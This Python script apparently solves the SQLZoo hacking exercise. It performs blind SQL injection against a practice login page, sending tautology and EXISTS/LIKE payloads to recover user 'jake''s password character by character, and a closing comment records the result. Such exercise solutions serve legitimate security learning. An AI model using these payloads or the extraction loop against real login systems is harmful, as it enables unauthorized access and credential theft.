#!env/bin/python3

import requests
from bs4 import BeautifulSoup 
from itertools import chain


URL = "http://sqlzoo.net/hack/passwd.pl"

userJake  = "jake"

userXXX = "xxx"
trueQuery = "' OR ''='"


def makeQuery(query :str, user :str = "xxx") -> dict:
    statement = "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '{}') AND ''='"
    senha = statement.format(query)
    #print("Fazendo senha para: %s\n" % query)
    pwd = {"name":user, "password":senha}
    return pwd


def conectaCom(nome : str, senha : str) -> bool:
    assert(type(nome)==str)
    assert(type(senha)==str)
    parametros = {"name": nome, "password": senha}
    resultado = requests.get(URL, params=parametros)
    #print("Sucesso") if "Welcome" in resultado.text else print("Fracasso")
    return "Welcome" in resultado.text


def conecta(parametros:str)->bool:
    #print("Username: %s\nSenha: %s\n" %(parametros["name"], parametros["password"]))
    resultado = requests.get(URL, params=parametros)
    #print("Conectando a: %s\n" % resultado.url)
    #print("Sucesso") if "Welcome" in resultado.text else print("Fracasso")
    return "Welcome" in resultado.text


def obtemLetrasDaSenha():
    resposta = ""

    intervaloSimbolos = chain(range(32,48),range(58,65),range(91,97), range(123, 127))
    intervaloNumeros = range(48,58)
    intervaloLetras = range(65,91)
    intervaloTodos = chain(intervaloSimbolos, intervaloLetras, intervaloNumeros)

    for code in intervaloTodos:
        encontrado = conecta(makeQuery("%"+chr(code)+"%"))
        print("Analisando "+chr(code)+"\n")
        if encontrado:
            resposta += (chr(code))
            print("A senha contém: %s\n" %(resposta))
    print("A senha contém: %s\n" %(resposta))
    return resposta

letras = ["d","e","l","o","w"]

def obtemOrdemDoisADois():
    resposta = ""
    tuplas = []
    for code1 in letras:
        print("%s:" %code1)
        for code2 in letras:
            print("\    %s" %code2)
            ordem = conecta(makeQuery("%"+code1+code2+"%"))
            if(ordem):
                print("%s vem antes de %s." %(code1, code2))
                resposta += code1+" vem antes de "+code2+"\n"
                tuplas = tuplas + [(code1, code2)]
    print("FIM: \n%s" %resposta)
obtemOrdemDoisADois()
# Senha jake = elwood